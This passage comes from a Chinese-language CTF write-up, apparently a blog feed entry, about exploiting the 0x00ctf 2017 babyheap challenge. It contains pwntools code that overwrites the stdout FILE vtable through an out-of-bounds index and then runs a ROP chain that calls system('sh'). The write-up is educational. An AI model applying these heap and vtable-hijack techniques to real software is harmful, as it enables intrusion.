+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># 在 name buf 布置数据</div><div class="line">choice(4)</div><div class="line">payload = &quot;&quot;</div><div class="line">payload += p64(stdout_vtable_addr)  # 修改虚表指针</div><div class="line">payload += p64(libc.symbols[&apos;gets&apos;]) # rip for call    qword ptr [rax+20h]</div><div class="line">payload += &quot;b&quot; *  0x10 # padding</div><div class="line">payload += p64(gadget)      # mov     rdi, rsp        ; gadget start 的地址</div><div class="line">payload += cyclic(0x28 - len(payload))</div><div class="line">p.sendafter(&quot;enter new name:&quot;, payload)</div></pre></td></tr></table></figure>
+<p>然后往触发漏洞，修改 <code>_IO_2_1_stdout_-&gt;vtable</code> 为 <code>bss_name - 0x18</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"># 利用 越界 获取指针的漏洞进行任意地址写</div><div class="line">choice(2)</div><div class="line">p.sendlineafter(&quot;2. insecure edit&quot;, &quot;2&quot;)</div><div class="line">sleep(0.1)</div><div class="line">p.sendlineafter(&quot;index: &quot;, &apos;12&apos;)   # index 12 ---&gt; 会从 name 开始处取8字节作为指针</div><div class="line">sleep(0.1)</div><div class="line">payload = p64(bss_name - 0x18) # padding for let </div><div class="line">p.sendafter(&quot;new username: &quot;, payload[:6])   # 修改的数据， 把虚表改到 bss .</div><div class="line">info(&quot;_IO_2_1_stdout_-&gt;vtable(&#123;&#125;)---&gt; bss_name&quot;.format(hex(stdout_vtable_addr)))</div><div class="line"># gdb.attach(p)</div><div class="line">pause()</div></pre></td></tr></table></figure>
+<p> 这就使得 接下来 <code>call [eax + 0x38]</code> 会变成  <code>call [name+0x20]</code> ， 也就是 进入 <code>gadget</code> 。</p>
+<p>会调用  <code>call    qword ptr [rax+20h]</code>  ，其实就是   <code>call [name+0x8]</code>   ， 之前已经设置为 <code>gets</code> 函数的地址，所以会调用 <code>gets</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">pop_rdi_ret = 0x0000000000400f13</div><div class="line"></div><div class="line"># zero addr</div><div class="line">zero_addr = 0x6020c8  #  该位置的值为 p64(0)</div><div class="line">info(&quot;zero_addr: &quot; + hex(zero_addr))</div><div class="line">payload = &apos;a&apos; * 8</div><div class="line">payload += p64(zero_addr - 0x38)</div><div class="line">payload += cyclic(40)</div><div class="line">payload += p64(pop_rdi_ret)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(libc.symbols[&apos;system&apos;])</div><div class="line">p.sendline(payload)</div></pre></td></tr></table></figure>
+<p>然后通过 <code>gets</code> 往栈里面布置数据， 把 <code>rsp+8</code> 设置为 <code>zero_addr</code> （该位置的值为 <code>p64(0)</code>），然后 <code>rop</code> 调用 <code>system(&quot;sh&quot;)</code> 即可</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430135304-bfa26a0e-4c3a-1.png" alt="image.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p> <code>authnone_create-0x35</code> 处的这个 <code>gadget</code> 还是比较有趣的，以后能控制 rax 处的内容 时可以选择用这种方式, 比如可以修改 虚表指针时。</p>
+<p><strong>参考</strong></p>
+<p><a href="https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/babyheap-200" target="_blank" rel="external">https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/babyheap-200</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> ctf </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> ctf </tag>
+            
+        </tags>
         
     </entry>
     
